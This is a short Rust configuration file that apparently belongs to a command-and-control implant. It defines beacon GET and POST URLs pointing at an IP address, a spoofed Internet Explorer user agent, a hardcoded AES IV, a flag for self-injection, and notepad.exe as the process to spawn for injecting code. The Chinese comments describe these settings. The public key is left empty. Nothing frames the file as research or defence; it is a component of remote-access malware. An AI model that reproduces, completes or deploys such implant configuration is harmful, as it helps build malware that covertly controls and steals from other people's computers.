pub const PUB_KEY: &str = "-----BEGIN PUBLIC KEY-----
-----END PUBLIC KEY-----";
pub const USER_AGENT: &str =
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; Avant Browser)";
pub const C2_GET_URL: &str = "http://192.168.244.130/visit.js";
pub const C2_GET_RANDOM_MIN: usize = 0; // 假设你想要一个无符号整数
pub const C2_GET_RANDOM_MAX: usize = 0; // 假设你想要一个无符号整数
pub const C2_POST_URL: &str = "http://192.168.244.130/submit.php?id=";
// 随机字符串header
pub const C2_RANDOM: &str = "hello";
// AES IV
pub const AES_IV: &[u8; 16] = b"abcdefghijklmnop";
// 是否注入自身
pub const INJECT_SELF: bool = false;
// 要注入的进程
pub const SPAWN_PROCESS: &str = "C:\\Windows\\System32\\notepad.exe";
